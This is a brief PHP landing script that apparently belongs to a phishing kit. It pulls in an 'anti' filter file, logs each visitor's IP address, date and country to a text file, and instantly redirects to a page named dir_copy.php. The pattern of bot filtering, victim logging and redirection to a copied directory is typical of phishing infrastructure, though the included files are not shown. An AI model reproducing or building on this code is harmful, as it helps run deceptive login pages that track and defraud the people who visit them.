<?php
	error_reporting(E_ERROR | E_PARSE);
	session_start();
	include('app/anti/anti.php');
	include('app/include/get_os.php');
	include('app/include/session_lg.php');
	$YSDIR = fopen("visitors.txt","a");
	fwrite($YSDIR, visitor_ip() . " | " . $DATE . " | " . $country . "\n");
	echo '<meta http-equiv="refresh" content="0; URL=dir_copy.php" />';
?>